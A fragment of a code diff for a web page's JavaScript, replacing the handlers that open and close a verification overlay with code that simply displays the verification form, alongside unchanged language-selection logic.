+                verificationForm.style.display = 'block';
+                document.body.style.backgroundColor = '#f0f2f5';
+            });
+            
             // Set initial language
             let currentLanguage = 'en';
             updateTranslations(currentLanguage);
-            
-            // Show verification form when button is clicked
-            getStartedBtn.addEventListener('click', function() {
-                verificationOverlay.style.display = 'block';
-                document.body.style.overflow = 'hidden';
-            });
-            
-            // Close verification form
-            closeVerification.addEventListener('click', function() {
-                verificationOverlay.style.display = 'none';
-                document.body.style.overflow = 'auto';
-            });
-            
-            // Close when clicking outside the form
-            verificationOverlay.addEventListener('click', function(e) {
-                if (e.target === verificationOverlay) {
-                    verificationOverlay.style.display = 'none';
-                    document.body.style.overflow = 'auto';
-                }
-            });
             
             // Language change handler
             languageSelector.addEventListener('change', function() {
